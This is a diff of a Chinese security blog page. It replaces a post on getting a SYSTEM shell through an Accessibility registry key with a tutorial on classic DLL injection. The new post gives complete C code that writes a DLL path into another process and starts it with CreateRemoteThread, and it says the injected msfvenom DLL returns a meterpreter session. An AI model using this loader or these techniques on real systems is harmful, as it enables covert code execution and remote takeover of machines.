@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>另一种获得系统SHELL的方法 - 辅助技术 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="另一种获得系统SHELL的方法 - 辅助技术 | 九世的博客">
+  <title>经典DLL injection | 九世的博客</title>
+  <meta name="keywords" content=" DLL injection ">
+  <meta name="description" content="经典DLL injection | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1006,9 +1006,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-另一种获得系统SHELL的方法-辅助技术" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-经典DLL-injection" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">另一种获得系统SHELL的方法 - 辅助技术</h1>
+        <h1 class="article-title">经典DLL injection</h1>
     
     <div class="article-meta">
         
@@ -1017,14 +1017,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">DLL injection</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-09-07 22:43</time>
+        创建时间:<time class="date" title="更新时间: 2019-09-14 17:24:56">2019-09-14 17:01</time>
         
     </div>
     <div class="article-meta">
@@ -1046,7 +1046,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#这里做一个简单的纪录"><span class="toc-text">这里做一个简单的纪录</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DLL注入的由来"><span class="toc-text">DLL注入的由来</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#经典DLL注入的流程"><span class="toc-text">经典DLL注入的流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C实现"><span class="toc-text">C实现</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1061,8 +1061,29 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="这里做一个简单的纪录"><a href="#这里做一个简单的纪录" class="headerlink" title="这里做一个简单的纪录"></a>这里做一个简单的纪录</h2><p>原文是来自：<a href="https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/" target="_blank" rel="noopener">Another way to get to a system shell – Assistive Technology – Oddvar Moe’s Blog</a><br><img src="https://s1.ax1x.com/2018/09/07/iPQBx1.png" alt="iPQBx1.png"></p>
-<p>运行regedit<br><img src="https://s1.ax1x.com/2018/09/07/iPQrKx.png" alt="iPQrKx.png"><br>在注册表里找到<code>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Accessibility \ ATs \ magnifierpane</code><br><img src="https://s1.ax1x.com/2018/09/07/iPQgaD.png" alt="iPQgaD.png"><br>然后给权限这个项目，修改值就好<br>给注册表权限：<a href="http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html" target="_blank" rel="noopener">http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html</a><br>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPQWPH.md.png" alt="iPQWPH.md.png"><br>转载请声明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在某文章中见到dll injection的操作，打算用C写一下。搜了好久发现都是C++和C#的示例，找了好久才发现C的真的是难受的一批</p>
+<p><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1568462332111&amp;di=a75ef31c4f03d06d479caac583297cd2&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fitem%2F201706%2F08%2F20170608023310_k25jY.thumb.700_0.gif" alt=""></p>
+<h2 id="DLL注入的由来"><a href="#DLL注入的由来" class="headerlink" title="DLL注入的由来"></a>DLL注入的由来</h2><p>DLL注入一般为了方便不修改程序的主题而能实现其他功能，比如：外挂，程序补丁等。可以通过DLL注入来完成，DLL注入现在分为很多种。现在最流行的是反射型DLL注入，这里先学习最基础的经典DLL注入。</p>
+<h2 id="经典DLL注入的流程"><a href="#经典DLL注入的流程" class="headerlink" title="经典DLL注入的流程"></a>经典DLL注入的流程</h2><p><img src="https://s2.ax1x.com/2019/09/14/n6AyZT.png" alt=""></p>
+<h2 id="C实现"><a href="#C实现" class="headerlink" title="C实现"></a>C实现</h2><p>代码如下：</p>
+<pre><code class="C">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;string.h&gt;
+
+int main(){
+    HANDLE hprocess=OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE,FALSE,4860); //打开现有的本地进程对象，参考链接：https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
+    LPVOID dllpath=&quot;C:\\Users\\jiushi\\Desktop\\demo.dll&quot;; //没有类型的指针
+    FARPROC load=GetProcAddress(GetModuleHandle(&quot;Kernel32&quot;), &quot;LoadLibraryA&quot;); //获取运行时类型句柄，调用dll的函数，参考链接：https://docs.microsoft.com/en-us/dotnet/api/system.runtimetypehandle.getmodulehandle?view=netframework-4.8
+    char * pszLibFileRemote = (char *) VirtualAllocEx(hprocess,NULL,strlen(dllpath)+1,MEM_COMMIT,PAGE_READWRITE); //保留，提交或更改指定进程的虚拟地址空间内的内存区域的状态 参考链接：https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
+    WriteProcessMemory(hprocess, pszLibFileRemote, (PVOID) dllpath, strlen(dllpath)+1, NULL); //将数据写入指定进程中的内存区域,参考链接：https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
+    CreateRemoteThread(hprocess, NULL, 0,(LPTHREAD_START_ROUTINE)load, pszLibFileRemote, 0, NULL); //创建在另一个进程的虚拟地址空间中运行的线程，参考链接：https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
+    return 0;
+}
+</code></pre>
+<p>上面的4860是进程ID，dll是用msfvenom生成的。成功注入进程后将会返回一个meterpreter</p>
+<p><img src="https://s2.ax1x.com/2019/09/14/n6ZmIU.jpg" alt=""></p>
+<p>而进程是这样的</p>
+<p><img src="https://s2.ax1x.com/2019/09/14/n6Z8qx.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1072,12 +1093,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>另一种获得系统SHELL的方法 - 辅助技术</p>
+    <p><span class="copy-title">文章标题:</span>经典DLL injection</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-09-07, 22:43:05</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/f638278f.html" title="另一种获得系统SHELL的方法 - 辅助技术">http://422926799.github.io/posts/f638278f.html</a>
+    <p><span class="copy-title">发布时间:</span>2019-09-14, 17:01:05</p>
+    <p><span class="copy-title">最后更新:</span>2019-09-14, 17:24:56</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/e84fbfc9.html" title="经典DLL injection">http://422926799.github.io/posts/e84fbfc9.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
